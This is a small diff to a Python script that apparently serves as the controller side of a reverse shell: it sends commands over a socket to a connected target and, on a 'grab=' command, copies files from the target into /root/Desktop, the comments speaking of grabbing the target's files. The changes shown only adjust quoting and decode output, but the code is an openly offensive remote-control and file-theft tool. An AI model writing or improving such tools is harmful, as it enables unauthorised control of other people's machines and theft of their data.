@@ -3,7 +3,7 @@ import socket
 def transfer(conn,command): #function (connecting) grab part
 	conn.send(command.encode())
 	grab,path=command.split('=')
-	f=open("/root/Desktop/"+path,"wb")  #path  assigned  to our system for grabing targets file
+	f=open("/root/Desktop/"+path,'wb')  #path  assigned  to our system for grabing targets file
 	while True:
 		bits=conn.recv(1024)
 		if bits.endswith ("END".encode()):
@@ -33,7 +33,7 @@ def connecting():
 			transfer(conn,command)
 		else:
 			conn.send(command.encode())
-			print(conn.recv(1024))
+			print(conn.recv(1024).decode())
 def main():
 	connecting()
 main()
